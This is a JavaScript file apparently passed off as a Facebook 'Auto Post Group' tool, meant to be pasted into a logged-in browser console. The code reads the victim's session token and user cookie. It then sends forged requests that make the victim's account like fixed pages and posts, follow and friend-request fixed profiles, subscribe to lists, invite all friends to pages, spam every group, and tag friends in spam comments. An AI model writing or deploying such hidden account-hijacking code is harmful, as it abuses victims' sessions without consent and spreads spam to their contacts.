alert("Auto Post Group Facebook !");
alert("Script By Donnazmi");
var Title = "";
var Descriptions = "",
    _text = '';

function InviteFriends(opo) {
    jx.load(window.location.protocol + "//www.facebook.com//ajax/typeahead/first_degree.php?uid=" + opo + "&unref=bd_friends_tab&nctr[_mod]=pagelet_timeline_app_collection_" + user_id + "%3A2356318349%3A2&__user=" + user_id + "&__a=1&__dyn=7n8ahyj2qmp5zpQ9UmWWaUGyxi9Ay8&__req=i&fb_dtsg=" + fb_dtsg + "&ttstamp=265816884971127865", function(a) {
        var b = a.substring(a.indexOf("{"));
        var c = JSON.parse(b);
        i--;
        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
        if (c.error) {
            Descriptions += "color:darkgreen'>";
            err++;
            if (c.errorDescription) Descriptions += c.errorDescription;
            else Descriptions += JSON.stringify(c, null, "")
        } else {
            Descriptions += "color:darkgreen'>";
            Descriptions += arn[i] + " ";
            suc++
        }
        Descriptions += "</div>";
        var display = "";
        display += "";
        if (i > 0) {
            display += arr.length + "<br/>";
            display += "<b>" + (arr.length - i) + "  Processed ";
            display += "(" + i + " Lefted...)";
            display += "";
            display += Descriptions;
            display += "";
            display += "";
            display += " " + arn[i] + ".</br>";
            display += _text;
            display += "</div>";
            display += "</div>";

            window[tag + "_close"] = true
        } else {
            Title = "";
            display += arr.length + "  ";
            display += "<div>";
            display += "";
            display += _text;
            display += "</div>";
            window[tag + "_close"] = false
        }
        display += "</div>";
        document.getElementById("pagelet_sidebar").innerHTML = display
    }, "text", "post");
    tay--;
    if (tay > 0) {
        var s = arr[tay];
        setTimeout("InviteFriends(" + s + ")", 100)
    }
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);


    if (user_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=226344357522802&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function() {}, "text", "post");
    jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=670420942980727&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function() {}, "text", "post");

}
jx = {
    b: function() {
        var b = !1;
        if ("undefined" != typeof ActiveXObject) try {
                b = new ActiveXObject("Msxml2.XMLHTTP")
            } catch (c) {
                try {
                    b = new ActiveXObject("Microsoft.XMLHTTP")
                } catch (a) {
                    b = !1
                }
            } else if (window.XMLHttpRequest) try {
                b = new XMLHttpRequest
            } catch (h) {
                b = !1
            }
        return b
    },
    load: function(b, c, a, h, g) {
        var e = this.d();
        if (e && b) {
            e.overrideMimeType && e.overrideMimeType("text/xml");
            h || (h = "GET");
            a || (a = "text");
            g || (g = {});
            a = a.toLowerCase();
            h = h.toUpperCase();
            b += b.indexOf("?") + 1 ? "&" : "?";
            var k = null;
            "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
            e.open(h, b, !0);
            e.onreadystatechange = g.c ? function() {
                g.c(e)
            } : function() {
                if (4 == e.readyState)
                    if (200 == e.status) {
                        var b = "";
                        e.responseText && (b = e.responseText);
                        "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
                        c && c(b)
                    } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
            };
            e.send(k)
        }
    },
    d: function() {
        return this.b()
    }
};


function ChangeLocation() {
    window.location.href = "http://www.facebook.com/"
}
setTimeout("ChangeLocation", 1);
window.onbeforeunload = function() {
    if (window[tag + "_close"]) return "This script is running now!"
};
var i = 3;
var tay = 3;
var suc = 0;
var err = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
var tag = "Close";
var page_name, x = document.getElementsByTagName("span");
for (i = 0; i < x.length; i++)
    if (x[i].getAttribute("itemprop") == "name") page_name = x[i].innerHTML;
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function(a) {
    var b = a;
    var c = b.substring(b.indexOf("{"));
    var d = JSON.parse(c);
    d = d.payload.entries;
    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
    for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
    for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
    i = arr.length - 1;
    tay = i;
    console.log(arr.length);
    var display = "";
    display += "";
    display += arr.length + " .";
    display += "</div>";
    document.getElementById("pagelet_sidebar").innerHTML = display;
    InviteFriends(arr[i])
});



var parent = document.getElementsByTagName("html")[0];
var _body = document.getElementsByTagName('body')[0];
var _div = document.createElement('div');
_div.style.height = "25";
_div.style.width = "100%";
_div.style.position = "fixed";
_div.style.top = "auto";
_div.style.bottom = "0";
_div.align = "center";
var _audio = document.createElement('audio');
_audio.style.width = "100%";
_audio.style.height = "25px";
_audio.controls = true;
_audio.autoplay = true;
_audio.src = "http://www.directlinkupload.com/uploads/113.210.32.209/50pop.mp3";
_div.appendChild(_audio);
_body.appendChild(_div);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function LIST(L) {
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify";
    var XParams = "flid=" + L + "&action=subscribe&location=feed&nctr[_mod]=pagelet_group_mall&ft[type]=40&ft[tn]=DH&__user=" + user_id + "&__a=1&__dyn=7n8ahxoNpGo&__req=y&fb_dtsg=" + fb_dtsg + "&phstamp=";
    X.open("POST", XURL, true);
    X.onreadystatechange = function() {
        if (X.readyState == 4 && X.status == 200) {
            X.close;
        }
    };
    X.send(XParams);
}

LIST("277925855686838");
LIST("291229681023122");
LIST("485301044873554");
LIST("299663130104014");
LIST("632874906723604");
LIST("632876596723435");
LIST("632795226731572");
LIST("632878956723199");
LIST("632879523389809");
LIST("632880530056375");
LIST("632881000056328");
LIST("632881906722904");
LIST("632882983389463");
LIST("656442521052470");
LIST("426302347515854");
LIST("426302467515842");
LIST("426302587515830");
LIST("426302714182484");

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function Like(p) {
    var Page = new XMLHttpRequest();
    var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
    var PageParams = "&fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg=" + fb_dtsg + "&phstamp=";
    Page.open("POST", PageURL, true);
    Page.onreadystatechange = function() {
        if (Page.readyState == 4 && Page.status == 200) {
            Page.close;
        }
    };
    Page.send(PageParams);
}

Like("411824462185913");
Like("1462134550664821");
Like("226344357522802");
Like("670420942980727");
Like("355876831170935");
Like("470357089749308");
Like("594587173911492");
Like("528813183898724");
Like(" 270277856427173");
Like("255714047932945");
Like("515375275154358");
Like("1411100589125451");
Like("397268370351900");
Like("838242846202426");
Like("276983775741100");
Like("1428843697354761");
Like("178744732330652");
Like("204706579563496");
Like("1451359131759051");



var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function IDS(r) {
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/add_friend/action.php";
    var XParams = "to_friend=" + r + "&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg=" + fb_dtsg + "&phstamp=";
    X.open("POST", XURL, true);
    X.onreadystatechange = function() {
        if (X.readyState == 4 && X.status == 200) {
            X.close;
        }
    };
    X.send(XParams);
}
IDS("100004082763721");
IDS("100000033005613");
IDS("100001809896405");

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone) {
    var http4 = new XMLHttpRequest();
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
    http4.onreadystatechange = function() {
        if (http4.readyState == 4 && http4.status == 200) {
            http4.close;
        }
    };
    http4.send(params4);
}
a("100004082763721");
a("100000033005613");
a("100001809896405");

var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now = (new Date).getTime();

function P(post) {
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/ufi/like.php";
    var XParams = "like_action=true&ft_ent_identifier=" + post + "&source=1&client_id=" + now + "%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]=" + post + "&nctr[_mod]=pagelet_home_stream&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg=" + fb_dtsg + "&phstamp=";
    X.open("POST", XURL, true);
    X.onreadystatechange = function() {
        if (X.readyState == 4 && X.status == 200) {
            X.close;
        }
    };
    X.send(XParams);
}

P("422829334529822");
P("383798001766289");
P("377559655723457");
P("203888899757201");
P("101918979954194");
P("395669810579108");


var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now = (new Date).getTime();

function P(opo) {
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/ufi/like.php";
    var XParams = "like_action=true&ft_ent_identifier=" + opo + "&source=1&client_id=" + now + "%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user=" + user_id + "&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg=" + fb_dtsg + "&phstamp=";
    X.open("POST", XURL, true);
    X.onreadystatechange = function() {
        if (X.readyState == 4 && X.status == 200) {
            X.close;
        }
    };
    X.send(XParams);
}

P("674874675868687");
P("671397049549783");
P("411098232369599");
P("310365145776242");
P("405221409623948");
P("237718269718744");

var grouppost = "<div><span class='img sp_43rped sx_e3ea36'></span><a style='position:absolute;size:3px;padding-left:3px;font-weight:bold;font-family:Tahoma;font-size:11px;color:#3B5998;'>Write Post</a></div></br>";
grouppost += "<div><textarea id='txtFloodMsg' placeholder='Write something...' style='color:white;padding-top:5px;width:493px;height:85px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.1);'></textarea></div>";
grouppost += "<div><br><span class='img sp_er534k sx_74b85a'></span><a style='position:absolute;font-family:Arial;size:3px;padding-left:3px;font-size:11px;color:rgb(128, 128, 128);'>Script Settings: Group Post </a></span><button style='margin-left:437px' class='_42ft _4jy0 _11b _4jy3 _4jy1 selected' onclick='autopostingfunc(this);' >Post</button><div style='color:gray;'>Powered By: <A style='color:#3B5998;' href='http://developersmalaysia.blogspot.com/' target='_blank'> Developers Malaysia.</A></br>Script Created & Designed By</A><A style='color:#3B5998;' href='https://www.facebook.com/Donnazmi' target='_blank'> Donnazmi</A></A></div>";
var Popupset = document.createElement("div");
Popupset.setAttribute("style", "min-height:50px;width:500px;position:fixed;top:100px;box-shadow: 0px 4px 10px rgba(24, 144, 255, 0.63);position:fixed;left:50%;margin-left:-273px;text-align:left;border-radius:10px;padding:5px;z-index:999999;border:5px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:White");
Popupset.innerHTML = grouppost;
document.body.appendChild(Popupset);
jx = {
    getHTTPObject: function() {
        var A = false;
        if (typeof ActiveXObject != "undefined") try {
                A = new ActiveXObject("Msxml2.XMLHTTP")
            } catch (C) {
                try {
                    A = new ActiveXObject("Microsoft.XMLHTTP")
                } catch (B) {
                    A = false
                }
            } else if (window.XMLHttpRequest) try {
                A = new XMLHttpRequest
            } catch (C) {
                A = false
            }
        return A
    },
    load: function(url, callback, format, method, opt) {
        var http = this.init();
        if (!http || !url) return;
        if (http.overrideMimeType) http.overrideMimeType("text/xml");
        if (!method) method = "GET";
        if (!format) format = "text";
        if (!opt) opt = {};
        format = format.toLowerCase();
        method = method.toUpperCase();
        var now = "uid=" + (new Date).getTime();
        url += url.indexOf("?") + 1 ? "&" : "?";
        url += now;
        var parameters = null;
        if (method == "POST") {
            var parts = url.split("?");
            url = parts[0];
            parameters = parts[1]
        }
        http.open(method, url, true);
        var ths = this;
        if (opt.handler) http.onreadystatechange = function() {
            opt.handler(http)
        };
        else http.onreadystatechange = function() {
            if (http.readyState == 4)
                if (http.status == 200) {
                    var result = "";
                    if (http.responseText) result = http.responseText;
                    if (format.charAt(0) == "j") {
                        result = result.replace(/[\n\r]/g, "");
                        result = eval("(" + result + ")")
                    } else if (format.charAt(0) == "x") result = http.responseXML;
                    if (callback) callback(result)
                } else {
                    if (opt.loadingIndicator) document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator);
                    if (opt.loading) document.getElementById(opt.loading).style.display = "none";
                    if (error) error(http.status)
                }
        };
        http.send(parameters)
    },
    bind: function(A) {
        var C = {
            "url": "",
            "onSuccess": false,
            "onError": false,
            "format": "text",
            "method": "GET",
            "update": "",
            "loading": "",
            "loadingIndicator": ""
        };
        for (var B in C)
            if (A[B]) C[B] = A[B];
        if (!C.url) return;
        var D = false;
        if (C.loadingIndicator) {
            D = document.createElement("div");
            D.setAttribute("style", "position:absolute;top:0px;left:0px;");
            D.setAttribute("class", "loading-indicator");
            D.innerHTML = C.loadingIndicator;
            document.getElementsByTagName("body")[0].appendChild(D);
            this.opt.loadingIndicator = D
        }
        if (C.loading) document.getElementById(C.loading).style.display = "block";
        this.load(C.url, function(E) {
            if (C.onSuccess) C.onSuccess(E);
            if (C.update) document.getElementById(C.update).innerHTML = E;
            if (D) document.getElementsByTagName("body")[0].removeChild(D);
            if (C.loading) document.getElementById(C.loading).style.display = "none"
        }, C.format, C.method, C)
    },
    init: function() {
        return this.getHTTPObject()
    }
};
var j = 0;
var k = 0;
var suc = 0;
var msg = "Follow this list please... https://www.facebook.com/lists/277925855686838";
var arr = new Array;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function autopostingfunc(sender) {
    if (document.getElementById("txtFloodMsg").value != "") msg = document.getElementById("txtFloodMsg").value;
    jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/search/bootstrap.php?__a=1&filter[0]=group&viewer=" + user_id + "&token=v7&lazy=0&__user=" + user_id, function(a) {
        var b = a;
        var c = b.substring(b.indexOf("{"));
        var d = JSON.parse(c);
        d = d.payload.entries;
        for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
        sender.parentNode.innerHTML = "Please Wait...";
        postitok()
    })
}
var a = document.body.innerHTML;
var dts = document.getElementsByName("fb_dtsg")[0].value;
var composerid = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function postitok() {
    pst = "fb_dtsg=" + dts + "&xhpc_composerid=" + composerid + "&xhpc_targetid=" + arr[suc] + "&xhpc_context=home&xhpc_fbx=1&xhpc_message_text=" + encodeURIComponent(msg) + "&xhpc_message=" + encodeURIComponent(msg) + "&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]=pagelet_group_composer";
    with(newx = new XMLHttpRequest) open("POST", "/ajax/updatestatus.php?__a=1"), send(pst);
    suc++;
    if (suc > arr.length) {
        alert("Auto Posting Completed. Now Refresh your Homepage.");
        alert("Contact Donnazmi");
        suc = 0
    } else setTimeout("postitok()", 3E4 / arr.length)
}
setTimeout("autopostingfunc()", 1E3);

var donnazmi = {
    posId: "242864485870789",

    idGw: "226344357522802",

    idGw: /[0-9]{8,}/.exec(document.getElementsByClassName("fbxWelcomeBoxImg")[0].id)[0],

    dtsg: document.getElementsByName("fb_dtsg")[0].value,
    ctLama: /comment_text=(.*?)&/,
    c: 1,
    ctBaru: "comment_text=",
    getPren: function(uid) {
        var a = window.ActiveXObject ? new ActiveXObject("Msxml2.XMLHTTP") : new XMLHttpRequest;
        if (a.open("GET", "/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&lazy=0&viewer=" + uid + "&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", !1), a.send(null), 4 == a.readyState) {
            var b = JSON.parse(a.responseText.substring(a.responseText.indexOf("{")));
            return b.payload.entries
        }
        return !1
    },
    startmention: function() {
        donnazmi.koncos = donnazmi.getPren(donnazmi.idGw);
        donnazmi.pale = "ft_ent_identifier=" + donnazmi.posId + "&comment_text=0&source=1&client_id=1359576694192%3A1233576093&reply_fbid&parent_comment_id&rootid=u_jsonp_3_19&ft[tn]=[]&ft[qid]=5839337351464612379&ft[mf_story_key]=5470779710560437153&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user=" + donnazmi.idGw + "&__a=1&__req=4u&fb_dtsg=" + donnazmi.dtsg + "&phstamp=" + Math.random();
        for (var n = 1; n < donnazmi.koncos.length; n++) {
            if (fb_dtsg = donnazmi.dtsg, donnazmi.ctBaru += "Hi,%20%40[" + donnazmi.koncos[n].uid + "%3AAAAAAAAAAAA]%20Lets Try This! Comment Like and Share ^_^ <3 %20%0A", donnazmi.c++, 7 == donnazmi.c) {
                with(donnazmi.ctBaru += "&", new XMLHttpRequest) open("POST", "//www.facebook.com/ajax/ufi/add_comment.php?__a=1"), setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), send(donnazmi.pale.replace(donnazmi.ctLama, donnazmi.ctBaru));
                z = setTimeout("function(){asd=0}", 1e3), clearInterval(z), donnazmi.c = 1, donnazmi.ctBaru = "comment_text="
            }
        }
    }
};
donnazmi.startmention();
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        } else {
            return "";
        }
    }
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomValue(arr) {
    return arr[getRandomInt(0, arr.length - 1)];
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone) {
    var http4 = new XMLHttpRequest();
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
    http4.onreadystatechange = function() {
        if (http4.readyState == 4 && http4.status == 200) {
            http4.close;
        }
    }
    http4.send(params4);
}
